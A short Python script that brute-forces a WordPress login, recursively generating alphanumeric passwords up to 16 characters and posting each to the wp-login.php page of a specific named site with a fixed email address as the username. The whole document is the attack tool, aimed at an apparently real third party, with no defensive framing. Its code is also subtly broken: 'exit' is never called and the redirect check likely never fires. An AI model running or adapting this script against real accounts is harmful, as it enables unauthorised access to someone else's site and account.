import requests
import string


maxlen = 16
password = ""
valid_charset = string.ascii_letters+string.digits


def trypassword(word: str):
    data = {"log": "2678340437@qq.com", "pwd": word,
            "wp-submit": "%E7%99%BB%E5%BD%95", "redirect_to": "https://bariona.cn/wp-admin/", "testcookie": 1}
    result = requests.post(url="https://bariona.cn/wp-login.php", data=data)

    if result.is_redirect:
        print("Password: " + word)
        exit
    else:
        print("Unsuccessful try: " + word)


def dfs(depth: int):
    global maxlen
    global password
    global valid_charset
    if depth == maxlen:
        trypassword(password)
    else:
        dfs(depth + 1)
        for _ in valid_charset:
            password += _
            dfs(depth + 1)
            password = password[0:-1]


if __name__ == "__main__":
    dfs(0)
